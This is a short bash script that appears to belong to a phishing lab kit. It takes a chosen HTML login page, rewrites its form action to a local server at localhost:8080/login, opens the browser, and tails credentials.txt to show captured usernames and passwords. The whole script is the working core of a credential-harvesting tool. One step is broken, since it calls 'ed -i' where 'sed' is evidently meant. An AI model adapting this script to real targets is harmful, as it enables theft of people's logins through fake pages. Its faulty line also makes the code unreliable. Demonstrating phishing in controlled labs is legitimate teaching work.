#!/bin/bash


HTML_DIR="."


echo ""
echo "==============================="
echo "   SELECT A LOGIN PAGE"
echo "==============================="

HTML_FILES=()
while IFS= read -r -d '' file; do
  HTML_FILES+=("$file")
done < <(find "$HTML_DIR" -maxdepth 1 -name "*.html" -print0 | sort -z)

if [ ${#HTML_FILES[@]} -eq 0 ]; then
  echo "[-] No HTML files found"
  exit 1
fi

for i in "${!HTML_FILES[@]}"; do
  echo "  [$((i+1))] ${HTML_FILES[$i]}"
done

echo ""
read -p "Enter number (1-${#HTML_FILES[@]}): " CHOICE

if ! [[ "$CHOICE" =~ ^[0-9]+$ ]] || \
   [ "$CHOICE" -lt 1 ] || \
   [ "$CHOICE" -gt "${#HTML_FILES[@]}" ]; then
  echo "[-] Invalid choice. Exiting."
  exit 1
fi


SELECTED="${HTML_FILES[$((CHOICE-1))]}"
BASENAME=$(basename "$SELECTED")

echo ""
echo "[+] Selected: $SELECTED"


cp "$SELECTED" login.html


sed -i 's|action="[^"]*"|action="http://localhost:8080/login"|gi' login.html
sed -i "s|action='[^']*'|action='http://localhost:8080/login'|gi" login.html

ed -i 's|<form |<form action="http://localhost:8080/login" |gi' login.html

echo "[+] Form action set to localhost"

echo "[*] Checking server..."
if ! curl -s --max-time 2 http://localhost:8080 > /dev/null; then
  echo "[-] Server is not running!"
  echo "    Open a new terminal and run: python3 server.py"
  exit 1
fi
echo "[+] Server is up"


echo "[*] Opening browser..."
echo "[*] Fill in the form and click submit"
echo ""
echo "==============================="
echo " Watch THIS terminal after"
echo " you submit the form!"
echo "==============================="

xdg-open http://localhost:8080 2>/dev/null


echo ""
echo "[*] Waiting for submissions... (Ctrl+C to stop)"
tail -f credentials.txt 2>/dev/null || \
  { touch credentials.txt && tail -f credentials.txt; }
